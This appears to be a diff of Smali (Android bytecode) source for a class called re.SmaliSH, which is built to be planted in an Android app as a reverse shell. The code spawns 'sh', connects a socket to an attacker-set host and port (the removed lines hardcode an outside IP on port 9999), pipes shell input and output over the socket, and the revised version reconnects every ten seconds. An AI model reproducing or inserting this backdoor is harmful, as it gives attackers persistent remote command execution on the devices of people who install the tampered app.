@@ -11,102 +11,99 @@
 
 .field public static final TAG:Ljava/lang/String; = "re.SmaliSH"
 
-.field public static final TARGET:Ljava/lang/String; = "{SMALISH_ADDRES}"
+.field public static TARGET:Ljava/lang/String; = null
 
-.field public static final TARGET_PORT:I = {SMALISH_PORT}
+.field public static TARGET_PORT:I = 0x0
 
 .field public static final VERBOSE:Z = true
+
+.field public static final plantOnce:Ljava/util/concurrent/atomic/AtomicBoolean;
 
 
 # instance fields
 .field final from:Ljava/io/InputStream;
 
-.field final p:Ljava/lang/Process;
+.field final proc:Ljava/lang/Process;
 
 .field final to:Ljava/io/OutputStream;
 
 
 # direct methods
-.method public constructor <init>(Ljava/lang/Process;Ljava/io/InputStream;Ljava/io/OutputStream;)V
-    .locals 0
-    .param p1, "p"    # Ljava/lang/Process;
-    .param p2, "from"    # Ljava/io/InputStream;
-    .param p3, "to"    # Ljava/io/OutputStream;
+.method static constructor <clinit>()V
+    .locals 1
 
-    .line 25
-    invoke-direct {p0}, Ljava/lang/Object;-><init>()V
+    .line 20
+    const-string v0, "{SMALISH_ADDRES}"
+
+    sput-object v0, Lre/SmaliSH;->TARGET:Ljava/lang/String;
+
+    .line 21
+    const/16 v0, {SMALISH_PORT}
+
+    sput v0, Lre/SmaliSH;->TARGET_PORT:I
 
     .line 26
-    iput-object p1, p0, Lre/SmaliSH;->p:Ljava/lang/Process;
+    new-instance v0, Ljava/util/concurrent/atomic/AtomicBoolean;
 
-    .line 27
-    iput-object p2, p0, Lre/SmaliSH;->from:Ljava/io/InputStream;
+    invoke-direct {v0}, Ljava/util/concurrent/atomic/AtomicBoolean;-><init>()V
+
+    sput-object v0, Lre/SmaliSH;->plantOnce:Ljava/util/concurrent/atomic/AtomicBoolean;
+
+    return-void
+.end method
+
+.method public constructor <init>(Ljava/io/InputStream;Ljava/io/OutputStream;Ljava/lang/Process;)V
+    .locals 0
+    .param p1, "from"    # Ljava/io/InputStream;
+    .param p2, "to"    # Ljava/io/OutputStream;
+    .param p3, "proc"    # Ljava/lang/Process;
 
     .line 28
-    iput-object p3, p0, Lre/SmaliSH;->to:Ljava/io/OutputStream;
+    invoke-direct {p0}, Ljava/lang/Object;-><init>()V
 
     .line 29
+    iput-object p1, p0, Lre/SmaliSH;->from:Ljava/io/InputStream;
+
+    .line 30
+    iput-object p2, p0, Lre/SmaliSH;->to:Ljava/io/OutputStream;
+
+    .line 31
+    iput-object p3, p0, Lre/SmaliSH;->proc:Ljava/lang/Process;
+
+    .line 32
     return-void
 .end method
 
 .method public static plant()V
-    .locals 5
+    .locals 4
 
-    .line 33
-    new-instance v0, Ljava/lang/ProcessBuilder;
+    .line 36
+    sget-object v0, Lre/SmaliSH;->plantOnce:Ljava/util/concurrent/atomic/AtomicBoolean;
 
-    const/4 v1, 0x1
+    const/4 v1, 0x0
 
-    new-array v1, v1, [Ljava/lang/String;
+    const/4 v2, 0x1
 
-    const-string v2, "sh"
+    invoke-virtual {v0, v1, v2}, Ljava/util/concurrent/atomic/AtomicBoolean;->compareAndSet(ZZ)Z
+
+    move-result v0
+
+    .line 37
+    .local v0, "planted":Z
+    if-nez v0, :cond_0
+
+    .line 38
+    return-void
+
+    .line 41
+    :cond_0
+    new-instance v1, Ljava/lang/Thread;
+
+    new-instance v2, Lre/SmaliSH;
 
     const/4 v3, 0x0
 
-    aput-object v2, v1, v3
-
-    invoke-direct {v0, v1}, Ljava/lang/ProcessBuilder;-><init>([Ljava/lang/String;)V
-
-    .line 34
-    .local v0, "proc":Ljava/lang/ProcessBuilder;
-    const/4 v1, 0x0
-
-    move-object v2, v1
-
-    .line 36
-    .local v2, "task":Lre/SmaliSH;
-    :try_start_0
-    new-instance v3, Lre/SmaliSH;
-
-    invoke-virtual {v0}, Ljava/lang/ProcessBuilder;->start()Ljava/lang/Process;
-
-    move-result-object v4
-
-    invoke-direct {v3, v4, v1, v1}, Lre/SmaliSH;-><init>(Ljava/lang/Process;Ljava/io/InputStream;Ljava/io/OutputStream;)V
-    :try_end_0
-    .catch Ljava/io/IOException; {:try_start_0 .. :try_end_0} :catch_0
-
-    move-object v2, v3
-
-    .line 40
-    goto :goto_0
-
-    .line 37
-    :catch_0
-    move-exception v1
-
-    .line 38
-    .local v1, "e":Ljava/io/IOException;
-    const-string v3, "re.SmaliSH"
-
-    const-string v4, "e"
-
-    invoke-static {v3, v4, v1}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)I
-
-    .line 41
-    .end local v1    # "e":Ljava/io/IOException;
-    :goto_0
-    new-instance v1, Ljava/lang/Thread;
+    invoke-direct {v2, v3, v3, v3}, Lre/SmaliSH;-><init>(Ljava/io/InputStream;Ljava/io/OutputStream;Ljava/lang/Process;)V
 
     const-string v3, "ReSmaliSH.proc"
 
@@ -121,342 +118,598 @@
 
 # virtual methods
 .method public run()V
-    .locals 6
+    .locals 9
 
     .line 46
     iget-object v0, p0, Lre/SmaliSH;->from:Ljava/io/InputStream;
 
-    if-nez v0, :cond_0
+    const/4 v1, 0x0
+
+    if-nez v0, :cond_c
 
     iget-object v0, p0, Lre/SmaliSH;->to:Ljava/io/OutputStream;
 
-    if-nez v0, :cond_0
+    if-nez v0, :cond_c
 
     .line 48
+    :goto_0
     const/4 v0, 0x0
 
-    .line 50
+    .line 49
     .local v0, "socket":Ljava/net/Socket;
-    :try_start_0
-    new-instance v1, Ljava/net/Socket;
+    const/4 v2, 0x0
 
-    const-string v2, "185.227.110.50"
-
-    const/16 v3, 0x270f
-
-    invoke-direct {v1, v2, v3}, Ljava/net/Socket;-><init>(Ljava/lang/String;I)V
-
-    move-object v0, v1
+    .line 50
+    .local v2, "p":Ljava/lang/Process;
+    const/4 v3, 0x0
 
     .line 51
-    const/4 v1, 0x1
-
-    invoke-virtual {v0, v1}, Ljava/net/Socket;->setKeepAlive(Z)V
-
-    .line 52
-    invoke-virtual {v0}, Ljava/net/Socket;->getOutputStream()Ljava/io/OutputStream;
-
-    move-result-object v1
-
-    const-string v2, "re.SmaliSH $ "
-
-    invoke-virtual {v2}, Ljava/lang/String;->getBytes()[B
-
-    move-result-object v2
-
-    invoke-virtual {v1, v2}, Ljava/io/OutputStream;->write([B)V
+    .local v3, "t1":Ljava/lang/Thread;
+    const/4 v4, 0x0
 
     .line 53
-    new-instance v1, Lre/SmaliSH;
+    .local v4, "t2":Ljava/lang/Thread;
+    :try_start_0
+    new-instance v5, Ljava/lang/ProcessBuilder;
 
-    iget-object v2, p0, Lre/SmaliSH;->p:Ljava/lang/Process;
+    const/4 v6, 0x1
 
-    invoke-virtual {v0}, Ljava/net/Socket;->getInputStream()Ljava/io/InputStream;
+    new-array v7, v6, [Ljava/lang/String;
 
-    move-result-object v3
+    const-string v8, "sh"
 
-    iget-object v4, p0, Lre/SmaliSH;->p:Ljava/lang/Process;
+    aput-object v8, v7, v1
 
-    invoke-virtual {v4}, Ljava/lang/Process;->getOutputStream()Ljava/io/OutputStream;
+    invoke-direct {v5, v7}, Ljava/lang/ProcessBuilder;-><init>([Ljava/lang/String;)V
 
-    move-result-object v4
+    invoke-virtual {v5}, Ljava/lang/ProcessBuilder;->start()Ljava/lang/Process;
 
-    invoke-direct {v1, v2, v3, v4}, Lre/SmaliSH;-><init>(Ljava/lang/Process;Ljava/io/InputStream;Ljava/io/OutputStream;)V
+    move-result-object v5
+
+    move-object v2, v5
 
     .line 54
-    .local v1, "taskIn":Lre/SmaliSH;
-    new-instance v2, Lre/SmaliSH;
+    new-instance v5, Ljava/net/Socket;
 
-    iget-object v3, p0, Lre/SmaliSH;->p:Ljava/lang/Process;
+    sget-object v7, Lre/SmaliSH;->TARGET:Ljava/lang/String;
 
-    iget-object v4, p0, Lre/SmaliSH;->p:Ljava/lang/Process;
+    sget v8, Lre/SmaliSH;->TARGET_PORT:I
 
-    invoke-virtual {v4}, Ljava/lang/Process;->getInputStream()Ljava/io/InputStream;
+    invoke-direct {v5, v7, v8}, Ljava/net/Socket;-><init>(Ljava/lang/String;I)V
 
-    move-result-object v4
+    move-object v0, v5
 
+    .line 55
+    invoke-virtual {v0, v6}, Ljava/net/Socket;->setKeepAlive(Z)V
+
+    .line 56
     invoke-virtual {v0}, Ljava/net/Socket;->getOutputStream()Ljava/io/OutputStream;
 
     move-result-object v5
 
-    invoke-direct {v2, v3, v4, v5}, Lre/SmaliSH;-><init>(Ljava/lang/Process;Ljava/io/InputStream;Ljava/io/OutputStream;)V
+    const-string v6, "re.SmaliSH $ "
 
-    .line 55
-    .local v2, "taskOut":Lre/SmaliSH;
-    new-instance v3, Ljava/lang/Thread;
+    invoke-virtual {v6}, Ljava/lang/String;->getBytes()[B
 
-    const-string v4, "ReSmaliSH.task.in"
+    move-result-object v6
 
-    invoke-direct {v3, v1, v4}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;Ljava/lang/String;)V
-
-    invoke-virtual {v3}, Ljava/lang/Thread;->start()V
-
-    .line 56
-    new-instance v3, Ljava/lang/Thread;
-
-    const-string v4, "ReSmaliSH.task.out"
-
-    invoke-direct {v3, v2, v4}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;Ljava/lang/String;)V
-
-    invoke-virtual {v3}, Ljava/lang/Thread;->start()V
+    invoke-virtual {v5, v6}, Ljava/io/OutputStream;->write([B)V
 
     .line 57
-    iget-object v3, p0, Lre/SmaliSH;->p:Ljava/lang/Process;
+    new-instance v5, Lre/SmaliSH;
 
-    invoke-virtual {v3}, Ljava/lang/Process;->waitFor()I
-    :try_end_0
-    .catch Ljava/io/IOException; {:try_start_0 .. :try_end_0} :catch_1
-    .catch Ljava/lang/InterruptedException; {:try_start_0 .. :try_end_0} :catch_0
+    invoke-virtual {v0}, Ljava/net/Socket;->getInputStream()Ljava/io/InputStream;
 
-    .end local v1    # "taskIn":Lre/SmaliSH;
-    .end local v2    # "taskOut":Lre/SmaliSH;
-    goto :goto_0
+    move-result-object v6
 
-    .line 61
-    :catch_0
-    move-exception v1
+    invoke-virtual {v2}, Ljava/lang/Process;->getOutputStream()Ljava/io/OutputStream;
 
-    .line 62
-    .local v1, "e":Ljava/lang/InterruptedException;
-    const-string v2, "re.SmaliSH"
+    move-result-object v7
 
-    const-string v3, "e"
-
-    invoke-static {v2, v3, v1}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)I
-
-    goto :goto_1
+    invoke-direct {v5, v6, v7, v2}, Lre/SmaliSH;-><init>(Ljava/io/InputStream;Ljava/io/OutputStream;Ljava/lang/Process;)V
 
     .line 58
-    .end local v1    # "e":Ljava/lang/InterruptedException;
-    :catch_1
-    move-exception v1
+    .local v5, "taskIn":Lre/SmaliSH;
+    new-instance v6, Lre/SmaliSH;
+
+    invoke-virtual {v2}, Ljava/lang/Process;->getInputStream()Ljava/io/InputStream;
+
+    move-result-object v7
+
+    invoke-virtual {v0}, Ljava/net/Socket;->getOutputStream()Ljava/io/OutputStream;
+
+    move-result-object v8
+
+    invoke-direct {v6, v7, v8, v2}, Lre/SmaliSH;-><init>(Ljava/io/InputStream;Ljava/io/OutputStream;Ljava/lang/Process;)V
 
     .line 59
-    .local v1, "e":Ljava/io/IOException;
-    const-string v2, "re.SmaliSH"
+    .local v6, "taskOut":Lre/SmaliSH;
+    new-instance v7, Ljava/lang/Thread;
 
-    const-string v3, "e"
+    const-string v8, "ReSmaliSH.task.in"
 
-    invoke-static {v2, v3, v1}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)I
+    invoke-direct {v7, v5, v8}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;Ljava/lang/String;)V
 
-    .line 64
-    .end local v0    # "socket":Ljava/net/Socket;
-    .end local v1    # "e":Ljava/io/IOException;
-    :goto_0
+    move-object v3, v7
+
+    .line 60
+    new-instance v7, Ljava/lang/Thread;
+
+    const-string v8, "ReSmaliSH.task.out"
+
+    invoke-direct {v7, v6, v8}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;Ljava/lang/String;)V
+
+    move-object v4, v7
+
+    .line 61
+    invoke-virtual {v3}, Ljava/lang/Thread;->start()V
+
+    .line 62
+    invoke-virtual {v4}, Ljava/lang/Thread;->start()V
+
+    .line 63
+    invoke-virtual {v2}, Ljava/lang/Process;->waitFor()I
+    :try_end_0
+    .catch Ljava/io/IOException; {:try_start_0 .. :try_end_0} :catch_3
+    .catch Ljava/lang/InterruptedException; {:try_start_0 .. :try_end_0} :catch_1
+    .catchall {:try_start_0 .. :try_end_0} :catchall_0
+
+    .line 71
+    .end local v5    # "taskIn":Lre/SmaliSH;
+    .end local v6    # "taskOut":Lre/SmaliSH;
     nop
 
-    .line 65
+    .line 73
+    :try_start_1
+    invoke-virtual {v0}, Ljava/net/Socket;->close()V
+    :try_end_1
+    .catch Ljava/io/IOException; {:try_start_1 .. :try_end_1} :catch_0
+
+    .line 76
+    goto :goto_1
+
+    .line 74
+    :catch_0
+    move-exception v5
+
+    .line 75
+    .local v5, "e":Ljava/io/IOException;
+    const-string v6, "re.SmaliSH"
+
+    const-string v7, "e"
+
+    invoke-static {v6, v7, v5}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)I
+
+    .line 78
+    .end local v5    # "e":Ljava/io/IOException;
     :goto_1
+    if-eqz v2, :cond_0
+
+    .line 79
+    invoke-virtual {v2}, Ljava/lang/Process;->destroy()V
+
+    .line 81
+    :cond_0
+    nop
+
+    .line 82
+    invoke-virtual {v3}, Ljava/lang/Thread;->interrupt()V
+
+    .line 84
+    nop
+
+    .line 85
+    :goto_2
+    invoke-virtual {v4}, Ljava/lang/Thread;->interrupt()V
+
+    goto :goto_5
+
+    .line 71
+    :catchall_0
+    move-exception v1
+
     goto :goto_6
 
-    .line 66
-    :cond_0
+    .line 67
+    :catch_1
+    move-exception v5
+
+    .line 68
+    .local v5, "e":Ljava/lang/InterruptedException;
+    :try_start_2
+    const-string v6, "re.SmaliSH"
+
+    const-string v7, "e"
+
+    invoke-static {v6, v7, v5}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)I
+    :try_end_2
+    .catchall {:try_start_2 .. :try_end_2} :catchall_0
+
+    .line 71
+    .end local v5    # "e":Ljava/lang/InterruptedException;
+    if-eqz v0, :cond_1
+
+    .line 73
+    :try_start_3
+    invoke-virtual {v0}, Ljava/net/Socket;->close()V
+    :try_end_3
+    .catch Ljava/io/IOException; {:try_start_3 .. :try_end_3} :catch_2
+
+    .line 76
+    goto :goto_3
+
+    .line 74
+    :catch_2
+    move-exception v5
+
+    .line 75
+    .local v5, "e":Ljava/io/IOException;
+    const-string v6, "re.SmaliSH"
+
+    const-string v7, "e"
+
+    invoke-static {v6, v7, v5}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)I
+
+    .line 78
+    .end local v5    # "e":Ljava/io/IOException;
+    :cond_1
+    :goto_3
+    if-eqz v2, :cond_2
+
+    .line 79
+    invoke-virtual {v2}, Ljava/lang/Process;->destroy()V
+
+    .line 81
+    :cond_2
+    if-eqz v3, :cond_3
+
+    .line 82
+    invoke-virtual {v3}, Ljava/lang/Thread;->interrupt()V
+
+    .line 84
+    :cond_3
+    if-eqz v4, :cond_7
+
+    goto :goto_2
+
+    .line 64
+    :catch_3
+    move-exception v5
+
+    .line 65
+    .restart local v5    # "e":Ljava/io/IOException;
+    :try_start_4
+    const-string v6, "re.SmaliSH"
+
+    const-string v7, "e"
+
+    invoke-static {v6, v7, v5}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)I
+    :try_end_4
+    .catchall {:try_start_4 .. :try_end_4} :catchall_0
+
+    .line 71
+    .end local v5    # "e":Ljava/io/IOException;
+    if-eqz v0, :cond_4
+
+    .line 73
+    :try_start_5
+    invoke-virtual {v0}, Ljava/net/Socket;->close()V
+    :try_end_5
+    .catch Ljava/io/IOException; {:try_start_5 .. :try_end_5} :catch_4
+
+    .line 76
+    goto :goto_4
+
+    .line 74
+    :catch_4
+    move-exception v5
+
+    .line 75
+    .restart local v5    # "e":Ljava/io/IOException;
+    const-string v6, "re.SmaliSH"
+
+    const-string v7, "e"
+
+    invoke-static {v6, v7, v5}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)I
+
+    .line 78
+    .end local v5    # "e":Ljava/io/IOException;
+    :cond_4
+    :goto_4
+    if-eqz v2, :cond_5
+
+    .line 79
+    invoke-virtual {v2}, Ljava/lang/Process;->destroy()V
+
+    .line 81
+    :cond_5
+    if-eqz v3, :cond_6
+
+    .line 82
+    invoke-virtual {v3}, Ljava/lang/Thread;->interrupt()V
+
+    .line 84
+    :cond_6
+    if-eqz v4, :cond_7
+
+    goto :goto_2
+
+    .line 88
+    :cond_7
+    :goto_5
+    const-wide/16 v5, 0x2710
+
+    invoke-static {v5, v6}, Landroid/os/SystemClock;->sleep(J)V
+
+    .line 89
+    .end local v0    # "socket":Ljava/net/Socket;
+    .end local v2    # "p":Ljava/lang/Process;
+    .end local v3    # "t1":Ljava/lang/Thread;
+    .end local v4    # "t2":Ljava/lang/Thread;
+    goto/16 :goto_0
+
+    .line 71
+    .restart local v0    # "socket":Ljava/net/Socket;
+    .restart local v2    # "p":Ljava/lang/Process;
+    .restart local v3    # "t1":Ljava/lang/Thread;
+    .restart local v4    # "t2":Ljava/lang/Thread;
+    :goto_6
+    if-eqz v0, :cond_8
+
+    .line 73
+    :try_start_6
+    invoke-virtual {v0}, Ljava/net/Socket;->close()V
+    :try_end_6
+    .catch Ljava/io/IOException; {:try_start_6 .. :try_end_6} :catch_5
+
+    .line 76
+    goto :goto_7
+
+    .line 74
+    :catch_5
+    move-exception v5
+
+    .line 75
+    .restart local v5    # "e":Ljava/io/IOException;
+    const-string v6, "re.SmaliSH"
+
+    const-string v7, "e"
+
+    invoke-static {v6, v7, v5}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)I
+
+    .line 78
+    .end local v5    # "e":Ljava/io/IOException;
+    :cond_8
+    :goto_7
+    if-eqz v2, :cond_9
+
+    .line 79
+    invoke-virtual {v2}, Ljava/lang/Process;->destroy()V
+
+    .line 81
+    :cond_9
+    if-eqz v3, :cond_a
+
+    .line 82
+    invoke-virtual {v3}, Ljava/lang/Thread;->interrupt()V
+
+    .line 84
+    :cond_a
+    if-eqz v4, :cond_b
+
+    .line 85
+    invoke-virtual {v4}, Ljava/lang/Thread;->interrupt()V
+
+    .line 87
+    :cond_b
+    throw v1
+
+    .line 91
+    .end local v0    # "socket":Ljava/net/Socket;
+    .end local v2    # "p":Ljava/lang/Process;
+    .end local v3    # "t1":Ljava/lang/Thread;
+    .end local v4    # "t2":Ljava/lang/Thread;
+    :cond_c
     const/16 v0, 0x2000
 
     new-array v0, v0, [B
 
-    .line 69
+    .line 94
     .local v0, "buf":[B
-    :goto_2
-    :try_start_1
-    iget-object v1, p0, Lre/SmaliSH;->from:Ljava/io/InputStream;
+    :goto_8
+    :try_start_7
+    invoke-static {}, Ljava/lang/Thread;->currentThread()Ljava/lang/Thread;
 
-    invoke-virtual {v1, v0}, Ljava/io/InputStream;->read([B)I
+    move-result-object v2
 
-    move-result v1
+    invoke-virtual {v2}, Ljava/lang/Thread;->isInterrupted()Z
 
-    .line 70
-    .local v1, "r":I
-    const/4 v2, -0x1
+    move-result v2
 
-    if-ne v1, v2, :cond_1
+    if-eqz v2, :cond_d
 
-    .line 71
-    const-string v2, "re.SmaliSH"
+    .line 95
+    goto :goto_9
+
+    .line 97
+    :cond_d
+    iget-object v2, p0, Lre/SmaliSH;->from:Ljava/io/InputStream;
+
+    invoke-virtual {v2, v0}, Ljava/io/InputStream;->read([B)I
+
+    move-result v2
+
+    .line 98
+    .local v2, "r":I
+    const/4 v3, -0x1
+
+    if-ne v2, v3, :cond_e
+
+    .line 99
+    const-string v1, "re.SmaliSH"
 
     const-string v3, "quit"
 
-    invoke-static {v2, v3}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I
+    invoke-static {v1, v3}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I
 
-    .line 72
-    iget-object v2, p0, Lre/SmaliSH;->p:Ljava/lang/Process;
+    .line 100
+    iget-object v1, p0, Lre/SmaliSH;->proc:Ljava/lang/Process;
 
-    invoke-virtual {v2}, Ljava/lang/Process;->destroy()V
-    :try_end_1
-    .catch Ljava/io/IOException; {:try_start_1 .. :try_end_1} :catch_3
-    .catchall {:try_start_1 .. :try_end_1} :catchall_0
+    invoke-virtual {v1}, Ljava/lang/Process;->destroy()V
+    :try_end_7
+    .catch Ljava/io/IOException; {:try_start_7 .. :try_end_7} :catch_8
+    .catchall {:try_start_7 .. :try_end_7} :catchall_1
 
-    .line 73
+    .line 101
     nop
 
-    .line 83
-    .end local v1    # "r":I
-    :try_start_2
+    .line 111
+    .end local v2    # "r":I
+    :goto_9
+    :try_start_8
     iget-object v1, p0, Lre/SmaliSH;->from:Ljava/io/InputStream;
 
     invoke-virtual {v1}, Ljava/io/InputStream;->close()V
-    :try_end_2
-    .catch Ljava/io/IOException; {:try_start_2 .. :try_end_2} :catch_2
+    :try_end_8
+    .catch Ljava/io/IOException; {:try_start_8 .. :try_end_8} :catch_6
 
-    .line 85
-    goto :goto_3
+    .line 113
+    goto :goto_a
 
-    .line 84
-    :catch_2
+    .line 112
+    :catch_6
     move-exception v1
 
-    .line 87
-    :goto_3
-    :try_start_3
+    .line 115
+    :goto_a
+    :try_start_9
     iget-object v1, p0, Lre/SmaliSH;->to:Ljava/io/OutputStream;
 
     invoke-virtual {v1}, Ljava/io/OutputStream;->close()V
-    :try_end_3
-    .catch Ljava/io/IOException; {:try_start_3 .. :try_end_3} :catch_5
+    :try_end_9
+    .catch Ljava/io/IOException; {:try_start_9 .. :try_end_9} :catch_7
 
-    goto :goto_5
+    .line 118
+    :goto_b
+    goto :goto_d
 
-    .line 75
-    .restart local v1    # "r":I
-    :cond_1
-    :try_start_4
-    iget-object v2, p0, Lre/SmaliSH;->to:Ljava/io/OutputStream;
-
-    const/4 v3, 0x0
-
-    invoke-virtual {v2, v0, v3, v1}, Ljava/io/OutputStream;->write([BII)V
-
-    .line 76
-    iget-object v2, p0, Lre/SmaliSH;->to:Ljava/io/OutputStream;
-
-    invoke-virtual {v2}, Ljava/io/OutputStream;->flush()V
-    :try_end_4
-    .catch Ljava/io/IOException; {:try_start_4 .. :try_end_4} :catch_3
-    .catchall {:try_start_4 .. :try_end_4} :catchall_0
-
-    .line 77
-    .end local v1    # "r":I
-    goto :goto_2
-
-    .line 82
-    :catchall_0
+    .line 116
+    :catch_7
     move-exception v1
 
-    goto :goto_7
+    .line 119
+    goto :goto_d
 
-    .line 78
-    :catch_3
+    .line 103
+    .restart local v2    # "r":I
+    :cond_e
+    :try_start_a
+    iget-object v3, p0, Lre/SmaliSH;->to:Ljava/io/OutputStream;
+
+    invoke-virtual {v3, v0, v1, v2}, Ljava/io/OutputStream;->write([BII)V
+
+    .line 104
+    iget-object v3, p0, Lre/SmaliSH;->to:Ljava/io/OutputStream;
+
+    invoke-virtual {v3}, Ljava/io/OutputStream;->flush()V
+    :try_end_a
+    .catch Ljava/io/IOException; {:try_start_a .. :try_end_a} :catch_8
+    .catchall {:try_start_a .. :try_end_a} :catchall_1
+
+    .line 105
+    .end local v2    # "r":I
+    goto :goto_8
+
+    .line 110
+    :catchall_1
     move-exception v1
 
-    .line 79
+    goto :goto_e
+
+    .line 106
+    :catch_8
+    move-exception v1
+
+    .line 107
     .local v1, "e":Ljava/io/IOException;
-    :try_start_5
+    :try_start_b
     const-string v2, "re.SmaliSH"
 
     const-string v3, "e"
 
     invoke-static {v2, v3, v1}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)I
-    :try_end_5
-    .catchall {:try_start_5 .. :try_end_5} :catchall_0
+    :try_end_b
+    .catchall {:try_start_b .. :try_end_b} :catchall_1
 
-    .line 83
+    .line 111
     .end local v1    # "e":Ljava/io/IOException;
-    :try_start_6
+    :try_start_c
     iget-object v1, p0, Lre/SmaliSH;->from:Ljava/io/InputStream;
 
     invoke-virtual {v1}, Ljava/io/InputStream;->close()V
-    :try_end_6
-    .catch Ljava/io/IOException; {:try_start_6 .. :try_end_6} :catch_4
+    :try_end_c
+    .catch Ljava/io/IOException; {:try_start_c .. :try_end_c} :catch_9
 
-    .line 85
-    goto :goto_4
+    .line 113
+    goto :goto_c
 
-    .line 84
-    :catch_4
+    .line 112
+    :catch_9
     move-exception v1
 
-    .line 87
-    :goto_4
-    :try_start_7
+    .line 115
+    :goto_c
+    :try_start_d
     iget-object v1, p0, Lre/SmaliSH;->to:Ljava/io/OutputStream;
 
     invoke-virtual {v1}, Ljava/io/OutputStream;->close()V
-    :try_end_7
-    .catch Ljava/io/IOException; {:try_start_7 .. :try_end_7} :catch_5
+    :try_end_d
+    .catch Ljava/io/IOException; {:try_start_d .. :try_end_d} :catch_7
 
-    .line 90
-    :goto_5
-    goto :goto_6
+    goto :goto_b
 
-    .line 88
-    :catch_5
-    move-exception v1
-
-    .line 91
-    nop
-
-    .line 95
+    .line 123
     .end local v0    # "buf":[B
-    :goto_6
+    :goto_d
     return-void
 
-    .line 82
+    .line 110
     .restart local v0    # "buf":[B
-    :goto_7
+    :goto_e
     nop
 
-    .line 83
-    :try_start_8
+    .line 111
+    :try_start_e
     iget-object v2, p0, Lre/SmaliSH;->from:Ljava/io/InputStream;
 
     invoke-virtual {v2}, Ljava/io/InputStream;->close()V
-    :try_end_8
-    .catch Ljava/io/IOException; {:try_start_8 .. :try_end_8} :catch_6
+    :try_end_e
+    .catch Ljava/io/IOException; {:try_start_e .. :try_end_e} :catch_a
 
-    .line 85
-    goto :goto_8
+    .line 113
+    goto :goto_f
 
-    .line 84
-    :catch_6
+    .line 112
+    :catch_a
     move-exception v2
 
-    .line 87
-    :goto_8
-    :try_start_9
+    .line 115
+    :goto_f
+    :try_start_f
     iget-object v2, p0, Lre/SmaliSH;->to:Ljava/io/OutputStream;
 
     invoke-virtual {v2}, Ljava/io/OutputStream;->close()V
-    :try_end_9
-    .catch Ljava/io/IOException; {:try_start_9 .. :try_end_9} :catch_7
+    :try_end_f
+    .catch Ljava/io/IOException; {:try_start_f .. :try_end_f} :catch_b
 
-    .line 90
-    goto :goto_9
+    .line 118
+    goto :goto_10
 
-    .line 88
-    :catch_7
+    .line 116
+    :catch_b
     move-exception v2
 
-    .line 91
-    :goto_9
+    .line 119
+    :goto_10
     throw v1
 .end method
